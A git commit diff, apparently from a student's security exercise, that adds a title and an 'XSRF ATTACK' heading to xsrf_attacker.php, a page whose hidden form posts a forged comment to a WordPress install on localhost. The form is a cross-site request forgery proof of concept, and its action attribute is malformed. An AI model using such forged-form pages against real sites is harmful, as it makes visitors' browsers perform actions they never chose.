97b2512f6c3fe7f1b5904bdbd6bd987d4369a3f2
1400205 <1400205@rgu.ac.uk>
2016-07-07 12:59:35 +0100

    change sales logo

--- xsrf_attacker.php
+++ xsrf_attacker.php
@@ -1,5 +1,13 @@
+<!doctype html>
 <html>
 
+<head>
+
+    <title>XSRF</title>
+
+
+</head>
+<h1> XSRF ATTACK</h1>
 <body>
 <form name="CSRF" action =action="http://localhost:85/frameworks/wordpress/wp-comments-post.php" method="post">
     <input type="hidden" name="comment" Value="XSRF ATTACK ONE">
